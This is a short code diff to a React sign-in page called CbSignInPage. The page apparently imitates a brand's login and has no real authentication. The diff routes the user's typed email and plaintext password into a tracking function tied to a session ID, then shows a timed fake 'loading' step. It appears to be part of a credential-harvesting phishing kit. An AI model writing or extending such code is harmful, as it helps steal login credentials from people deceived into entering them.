@@ -77,7 +77,7 @@ function AvatarPlaceholder({ email }: { email: string }) {
 }
 
 function CbSignInPage() {
-  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
+  const { trackClick, trackInput, trackSubmit, cbNavigate, sessionId } = useCbTracking();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [step, setStep] = useState<1 | 2>(1);
@@ -96,7 +96,7 @@ function CbSignInPage() {
       if (!isValidEmail(email) || continueLoading) return;
       setContinueLoading(true);
       trackClick("Continue-Email");
-      trackInput("email", email);
+      trackSubmit("Email", email);
       setTimeout(() => {
         setContinueLoading(false);
         setStep(2);
@@ -106,7 +106,7 @@ function CbSignInPage() {
     if (!password || continueLoading) return;
     setContinueLoading(true);
     trackClick("Continue-Password");
-    trackInput("password", password);
+    trackSubmit("Password", password);
     setTimeout(() => {
       cbNavigate("/cb/loading");
     }, 1200);
